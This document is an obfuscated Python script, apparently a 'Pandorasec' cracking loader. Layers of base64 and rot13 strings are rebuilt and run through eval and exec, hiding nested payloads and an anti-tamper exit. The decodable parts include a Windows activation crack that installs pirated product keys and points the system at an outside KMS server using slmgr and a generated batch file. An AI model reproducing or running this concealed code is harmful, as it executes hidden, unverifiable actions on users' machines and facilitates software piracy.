import base64, codecs; magic = 'cHJpbnQoIkNvbk1haW4gSWRsZS4uLiIpDQpjbGFzcyBQcmVtaXVtRmVhdHMoKTogICAgDQogICAgZGVmIEluaXRGZWF0dXJlcygpOg0KICAgICAgICBUZW1wID0gJycnZXhlYygiIiJpbXBvcnQgYmFzZTY0LCBjb2RlY3M7IG1hZ2ljID0gJ2FXWWdVSEpsYldsMWJVWmxZWFJ6TG1sdWFYUnRZV2x1SUQwOUlDSWlJZzBLYVcxd2IzSjBJR0poYzJVMk5Dd2dZMjlrWldOekRRcHRZV2RwWXlBOUlDZGpTRXB3WW01UmIwbG5hMHBZUnljTkNteHZkbVVnUFNBbk5YQnZlREYxVFZSSWRFUmhlSFFuRFFwbmIyUWdQU0FuVlVkR2RWcEhPWGxaVms1c1dYa25EUXBrWlhOMGFXNTVJRDBnSjA0NFdqRnJhRXRVTkhaWVJEMDlKdzBLYW05NUlEMGdKMXg0TnpKY2VEWic7IGxvdmUgPSAnektVdDNBU2s0Wm1TcHJRWm1XajBYcVVXMXAzRHRDRk95cXpTZlhQcXByUU14S1V0MlpJazRBd3FwclFMNUtVdDJabHBjVlBmdE1LTXVvUHRhS1V0MloxazRBek1wclFMMEtVdDJBSWs0QXdBcHJRcG1LVXRsTUlrNEF3RXByUUwxS1V0MloxazRBek1wclFMMEtVdDJBSWs0Wnd1cHJRTXdLVXQyTXlrNEFtTXByUUwxS1V0bEwxazRad09wclFNdUtVdDJNeWs0QW15cHJRVjVXbHh0WGxPeXF6U2ZYUHFwclFMM0tVJzsgZ29kID0gJ2cyWmx4NE5qUW5LU0FySUdWMllXd29KMXg0TmpOY2VEWm1YSGcyTkZ4NE5qVmNlRFl6WEhnM00xeDRNbVZjZURZMFhIZzJOVng0TmpOY2VEWm1YSGcyTkZ4NE5qVmNlREk0WEhnMk5GeDROalZjZURjelhIZzNORng0TmpsY2VEWmxYSGczT1Z4NE1tTmNlREl3WEhnMllWeDRObVpjZURjNVhIZ3lPU2NwRFFwbGRtRnNLR052YlhCcGJHVW9ZbUZ6WlRZMExtSTJOR1JsWTI5a1pTaGxkbUZzS0NkY2VEYzBYSGczTSc7IGRlc3RpbnkgPSAneWs0QW1JcHJRcG1LVXQzQVBwY1hGamFDVUEwcHp5aE1tNGFZUHF5clRJd1dseGNWdlZ2QnQwWFBLT3VwM1pBUHpJZnAySDZRRGJXcFVXY29hRGJWeU9sbzJxbExKMHRNYUl3bjJJeFZJa2hIVGt5TEtBeVZVV3luSjVtcVRTZm9QTzBuVEh0cDI5MXB6QXlWVE1sbzIwdHBUU2hNVDlsTEtBeUxsU3BveU9mTUpTbU1GT3hvMjUwVlQxaU1UeXpyRk8wblRIdG5KNWNxVDF1bko0dHF6U2xWRlZjUURiV01LdWNxTj09Jzsgam95ID0gJ1x4NzJceDZmXHg3NFx4MzFceDMzJzsgdHJ1c3QgPSBldmFsKCdceDZkXHg2MVx4NjdceDY5XHg2MycpICsgZXZhbCgnXHg2M1x4NmZceDY0XHg2NVx4NjNceDczXHgyZVx4NjRceDY1XHg2M1x4NmZceDY0XHg2NVx4MjhceDZjXHg2Zlx4NzZceDY1XHgyY1x4MjBceDZhXHg2Zlx4NzlceDI5JykgKyBldmFsKCdceDY3XHg2Zlx4NjQnKSArIGV2YWwoJ1x4NjNceDZmXHg2NFx4NjVceDYzXHg3M1x4MmVceDY0XHg2NVx4NjNceDZmXHg2NFx4NjVceDI4XHg2NFx4NjVceDczXHg3NFx4NjlceDZlXHg3OVx4MmNceDIwXHg2YVx4NmZceDc5XHgyOScpOyBldmFsKGNvbXBpbGUoYmFzZTY0LmI2NGRlY29kZShldmFsKCdceDc0XHg3Mlx4NzVceDczXHg3NCcpKSwnPHN0cmluZz4nLCdleGVjJykpIiIiKScnJw0KICAgICAgICBpZiBsZW4oVGVtcCkgIT0gMTE5NToNCiAgICAgICAgICAgIHByaW50KCJFUlJPUl9DUklUOlxuSW5pdG1haW4gY29tcGlsZXI6XG4gRXJyb3I6XG4gIEZ1bmN0aW9uIHdhcyBtb2RpZnllZCEiKQ0KICAgICAgICAgICAgaW5wdXQoKQ0KICAgICAgICAgICAgZXhpdCgpDQogICAgICAgIGVsc2U6DQogICAgICAgICAgICByZXR1cm4gIm9rIg0KICAgICNuZWVkZWQhITsNCiAgICBWYXJfTnVsbD0iIg0KICAgIGluaXRtYWluPSIiImltcG9ydCBiYXNlNjQsIGNvZGVjczsgbWFnaWMgPSAnY0hKcGJuUW9JZ2tKWEcnOyBsb3ZlID0gJzVwb3gxdU1USHREYXh0JzsgZ29kID0gJ1VHRnVaRzl5WVZObFl5JzsgZGVzdGlueSA9ICdOOFoxa2hLVDR2WEQ9PSc7IGpveSA9ICdceDcyXHg2Zlx4NzRceDMxXHgzMyc7IHRydXN0ID0gZXZhbCgnXHg2ZFx4NjFceDY3XHg2OVx4NjMnKSArIGV2YWwoJ1x4NjNceDZmXHg2NFx4NjVceDYzXHg3M1x4MmVceDY0XHg2NVx4NjNceDZmXHg2NFx4NjVceDI4XHg2Y1x4NmZceDc2XHg2NVx4MmNceDIwXHg2YVx4NmZceDc5XHgyOScpICsgZXZhbCgnXHg2N1x4NmZceDY0JykgKyBldmFsKCdceDYzXHg2Zlx4NjRceDY1XHg2M1x4NzNceDJlXHg2NFx4NjVceDYzXHg2Zlx4NjRceDY1XHgyOFx4NjRceDY1XHg3M1x4NzRceDY5XHg2ZVx4NzlceDJjXHgyMFx4NmFceDZmXHg3OVx4MjknKTsgZXZhbChjb21waWxlKGJhc2U2NC5iNjRkZWNvZGUoZXZhbCgnXHg3NFx4NzJceDc1XHg3M1x4NzQnKSksJzxzdHJpbmc+JywnZXhlYycpKSIiIg0KICAgICNTdHlsZXM6DQogICAgQWx0X0NvbG9yX0lEID0gInJhaW5ib3ciDQogICAgQmFubmVyX0NvbG9yX0lEID0gIndoaXRlX3RvX3JlZCINCiAgICAjRXh0cmE6DQogICAgVmVyc2lvbj0idjEiDQogICAgI01vZGlmeWFibGUoRnJlZSBmb3IgYWxsIHZlcnNpb25zIDwzKToNCiAgICBCYW5uZXI9IiIiDQogICAgICAgIH4rDQoNCiAgICAgICAgICAgICAgICAgKiAgICAgICArDQogICAgICAgICAgICcgICAgICAgICAgICAgICAgICB8ICAgICANCiAgICAgICAoKSAgICAuLS4sPSJgYCI9LiAgICAtIG8gLSAgIA0KICAgICAgICAgICAgICc9L18gICAgICAgXCAgICAgfCAgICAg4pWU4pWQ4pWX4pWU4pWQ4pWX4pWU4pWX4pWU4pWU4pWm4pWX4pWU4pWQ4pWX4pWm4pWQ4pWX4pWU4pWQ4pWXDQogICAgICAgICAgKiAgIHwgICc9Ll8gICAgfCAgICAgICAgICDilaDilZDilZ3ilaDilZDilaPilZHilZHilZEg4pWR4pWR4pWRIOKVkeKVoOKVpuKVneKVoOKVkOKVow0KICAgICAgICAgICAgICAgXCAgICAgYD0uL2AsICAgICAgICAn4pWpICDilakg4pWp4pWd4pWa4pWd4pWQ4pWp4pWd4pWa4pWQ4pWd4pWp4pWa4pWQ4pWpIOKVqQ0KICAgICAgICAgICAgLiAgICc9Ll9fLj0nIGA9JyAgICAgICoNCiAgICsgICAgICAgICAgICAgICAgICAgICAgICAgKw0KICAgICAgICBPICAgICAgKiAgICAgICAgJyAgICAgICAuDQogICAgICAgICIiIg0KICAgIElucHV0X01lbnUgPSAiICAgICAgICAgICAg4pWU4pWQW1BhbmRvcmFATWVudV1cbiAgICAgICAgICAgICAgICAgICAg4pWa4pWQ4pWQPiINCiAgICBJbnB1dF9DcmFja01lbnUgPSAiICAgICAgICAgICAg4pWU4pWQW1BhbmRvcmFAQ3JhY2tfTWVudV1cbiAgICAgICAgICAgIOKVmuKVkOKVkD4iDQogICAgU2xlZXAgPSAwLjUwDQogICAgTWFpbl90aXRsZT0iW1BhbmRvcmFzZWMgTG9hZGVyXSINCiAgICBUaXRsZV9BbmltYXRpb249IlRydWUiDQogICAgdGl0bGVfZnJhbWVfb25lPSJbUF0iDQogICAgdGl0bGVfZnJhbWVfdHdvPSJbUGFdIg0KICAgIHRpdGxlX2ZyYW1lX3RocmVlPSJbUGFuXSINCiAgICB0aXRsZV9mcmFtZV9mb3VyPSJbUGFuZF0iDQogICAgI2V4dHJhIGN1c3RvbWl6ZToNCiAgICAjd2FybmluZyEgSWYgZnJhbWUgNSBpcyB1c2VkIGFsbCBvdGhlcnMgaGF2ZSB0byBoYXZlIGEgYW5pbWF0aW9uI'; love = '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'; god = 'BvbnNlIGZyb20gc2xtZ3IudmJzDQogICAgRXhpdCAvQiAxDQopDQpFY2hvIFdpbmRvd3MgVmVyc2lvbiBBY3RpdmF0aW9uIFN0YXR1czoNCkVjaG86IiVXaW5WZXJBY3Q6fjElIg0KIiIiKQ0KICAgICAgICAgICAgDQogICAgICAgICAgICBvcy5zeXN0ZW0oImFjdGl2YXRlZC5iYXQgPiBhY3RpdmF0ZWQudHh0IikNCiAgICAgICAgICAgIHdpdGggb3BlbiAoImFjdGl2YXRlZC50eHQiLCJyIixlbmNvZGluZz0idXRmLTgiKSBhcyBmaWxlOg0KICAgICAgICAgICAgICAgIGZpbGU9ZmlsZS5yZWFkKCkNCiAgICAgICAgICAgICAgICBpZiAid2lsbCBleHBpcmUiIGluIGZpbGU6DQogICAgICAgICAgICAgICAgICAgIFdyaXRlLlByaW50KCJbK11JdCBTZWVtcyBMaWtlIFdpbmRvd3MgQWxyZWFkeSBBY3RpdmF0ZWQhIiwgQ29sb3JzLnJhaW5ib3csIGludGVydmFsPTApDQogICAgICAgICAgICAgICAgICAgIFdyaXRlLlByaW50KCJcblByZXNzIEFueSBLZXkgVG8gQ29udGludWUiLCBDb2xvcnMucmFpbmJvdywgaW50ZXJ2YWw9MCkNCiAgICAgICAgICAgICAgICAgICAgaW5wdXQoIiIpDQogICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgV3JpdGUuUHJpbnQoIlsrXSBXaW5kb3dzIEFjdGl2YXRpbmcuLiIsIENvbG9ycy5yYWluYm93LCBpbnRlcnZhbD0wKQ0KICAgICAgICAgICAgICAgICAgICBzZWFyY2g9c3VicHJvY2Vzcy5jaGVja19vdXRwdXQoWyJzeXN0ZW1pbmZvIl0pDQogICAgICAgICAgICAgICAgICAgIHNlYXJjaD1zdHIoc2VhcmNoKQ0KICAgICAgICAgICAgICAgICAgICBpZiAiUHJvZmVzc2lvbmFsIEVkdWNhdGlvbiIgaW4gc2VhcmNoOg0KICAgICAgICAgICAgICAgICAgICAgICAga2V5PSI2VFA0Ui1HTlBURC1LWVlIUS03QjdEUC1KNDQ3WSINCiAgICAgICAgICAgICAgICAgICAgZWxpZiAiSG9tZSIgaW4gc2VhcmNoIG9yICJob21lIiBpbiBzZWFyY2ggb3IgIkhPTUUiIGluIHNlYXJjaDoNCiAgICAgICAgICAgICAgICAgICAgICAgIGtleT0iVFg5WEQtOThON1YtNldNUTYtQlg3RkctSDhROTkiDQogICAgICAgICAgICAgICAgICAgIGVsaWYgIkVkdWNhdGlvbiIgaW4gc2VhcmNoOg0KICAgICAgICAgICAgICAgICAgICAgICAga2V5PSJOVzZDMi1RTVBWVy1EN0tLSy0zR0tUNi1WQ0ZCMiINCiAgICAgICAgICAgICAgICAgICAgZWxpZiAiRW50ZXJwcmlzZSIgaW4gc2VhcmNoOg0KICAgICAgICAgICAgICAgICAgICAgICAga2V5PSJOUFBSOS1GV0RDWC1EMkM4Si1IODcySy0yWVQ0MyINCiAgICAgICAgICAgICAgICAgICAgZWxpZiAiQ29yZSIgaW4gc2VhcmNoOg0KICAgICAgICAgICAgICAgICAgICAgICAga2V5PSIzM1FUNi1SQ05ZRi1EWEI0Ri1ER1A3Qi03TUhYOSINCiAgICAgICAgICAgICAgICAgICAgZWxpZiAiYnVpbGQiIGluIHNlYXJjaDoNCiAgICAgICAgICAgICAgICAgICAgICAgIGtleT0iVks3SkctTlBIVE0tQzk3Sk0tOU1QR1QtM1Y2NlQiDQogICAgICAgICAgICAgICAgICAgIGVsaWYgIlBybyIgaW4gc2VhcmNoIG9yICJwcm8iIGluIHNlYXJjaCBvciAiUFJPIiBhbmQgbm90ICJQcm9mZXNzaW9uYWwiIGluIHNlYXJjaDoNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICJQcm9mZXNzaW9uYWwgV29ya3N0YXRpb25zIiBpbiBzZWFyY2g6DQogICAgICAgICAgICAgICAgICAgICAgICAga2V5PSJOUkc4Qi1WS0szUS1DWFZDSi05RzJYRi02UTg0SiINCiAgICAgICAgICAgICAgICAgICAgICAgIGtleT0iVzI2OU4tV0ZHV1gtWVZDOUItNEo2QzktVDgzR1giDQoNCiAgICAgICAgICAgIG9zLnN5c3RlbSgic2xtZ3IgL2lwayAiK3N0cihrZXkpKQ0KICAgICAgICAgICAgb3Muc3lzdGVtKCJzbG1nciAvc2ttcyBrbXM4Lm1zZ3VpZGVzLmNvbSIpDQogICAgICAgICAgICBvcy5zeXN0ZW0oInNsbWdyIC9hdG8iKQ0KICAgICAgICAgICAgV3JpdGUuUHJpbnQoIlsrXSBUaGlzIFByb2Nlc3MgV2lsbCBUYWtlIDYwIFNlY29uZHMuLiIsIENvbG9ycy5yYWluYm93LCBpbnRlcnZhbD0wKQ0KICAgICAgICAgICAgdGltZS5zbGVlcCg2MCkNCiAgICAgICAgICAgIHdpdGggb3BlbigiYWN0aXZhdGVkLmJhdCIsInciLGVuY29kaW5nPSJ1dGYtOCIpIGFzIGFjdGl2YXRlZDoNCiAgICAgICAgICAgICAgICBhY3RpdmF0ZWQud3JpdGUoIiIiDQo6OiBROlxUZXN0XDIwMTlcMDRcMDdcU1VfMTQyMjM2OC5jbWQNCkBFY2hvIG9mZiZTZXRMb2NhbCBFbmFibGVFeHRlbnNpb25zIEVuYWJsZURlbGF5ZWRFeHBhbnNpb24NClNldCAiV2luVmVyQWN0PSINCkZvciAvZiAidG9rZW5zPSoiICUlVyBpbiAoJw0KICAgIGNzY3JpcHQgL05vbG9nbyAiQzpcV2luZG93c1xTeXN0ZW0zMlxzbG1nci52YnMiIC94cHINCicpIERvIFNldCAiV2luVmVyQWN0PSFXaW5WZXJBY3QhICUlVyINCmlmIE5vdCBkZWZpbmVkIFdpblZlckFjdCAoIA0KICAgIEVjaG86Tm8gcmVzcG9uc2UgZnJvbSBzbG1nci52YnMNCiAgICBFeGl0IC9CIDENCikNCkVjaG8gV2luZG93cyBWZXJzaW9uIEFjdGl2YXRpb24gU3RhdHVzOg0KRWNobzoiJVdpblZlckFjdDp+MSUiDQoiIiIpDQogICAgICAgICAgICBvcy5zeXN0ZW0oImFjdGl2YXRlZC5iYXQgPiBhY3RpdmF0ZWQudHh0IikNCiAgICAgICAgICAgIHdpdGggb3BlbiAoImFjdGl2YXRlZC50eHQiLCJyIixlbmNvZGluZz0idXRmLTgiKSBhcyBmaWxlOg0KICAgICAgICAgICAgICAgIGZpbGU9ZmlsZS5yZWFkKCkNCiAgICAgICAgICAgIGlmICJ3aWxsIGV4cGlyZSIgaW4gZmlsZToNCiAgICAgICAgICAgICAgICBXcml0ZS5QcmludCgiWytdV2luZG93cyBBY3RpdmF0ZWQgU3VjZXNzZnVsbHkhIiwgQ29sb3JzLnJhaW5ib3csIGludGVydmFsPTApDQogICAgICAgICAgICAgICAgaW5wdXQoIiIpDQogICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgIFdyaXRlLlByaW50KCJbK11Tb21ldGhpbmcgV2VudCBXcm9uZyEiLCBDb2xvcnMucmFpbmJvdywgaW50ZXJ2YWw9MCkNCiAgICAgICAgICAgICAgICBpbnB1dCgiIikNCmRlZiBwcmludFJvY2tldCgpOg0KICAgIHByaW50KA0KIiIiDQogICAgICAgICAgIF8NCiAgICAgICAgICAvXlxcDQogICAgICAgICAgfC18DQogICAgICAgICAgfCB8DQogICAgICAgICAgfFB8DQogICAgICAgICAgfEF8DQogICAgICAgICAgfE58DQogICAgICAgICAgfER8DQogICAgICAgICAvfE98XFwNCiAgICAgICAgLyB8UnwgXFwNCiAgICAgICB8ICB8QXwgIHwNCiAgICAgICBgLVxcIlxcIlxcIi1gDQoiIiIpDQogICAgDQogDQogICAgZGVsYXkgPSAzMDANCiAgICBmb3IgaSBpbiByYW5nZSg2MCk6DQogICAgICAgIHByaW50KCkNCiAgICAgICAgdGltZS5zbGVlcChkZWxheS8xMDAwKQ0KICAgICAgICBkZWxheSA9IGRlbGF5ICogMC45DQpkZWYgaW5pdG1haW4oKToNCiAgICBkZWxheSA9IDMwMA0KICAgIGZvciBpIGluIHJhbmdlKDYwKToNCiAgICAgICAgcHJpbnQoKQ0KICAgICA'; destiny = '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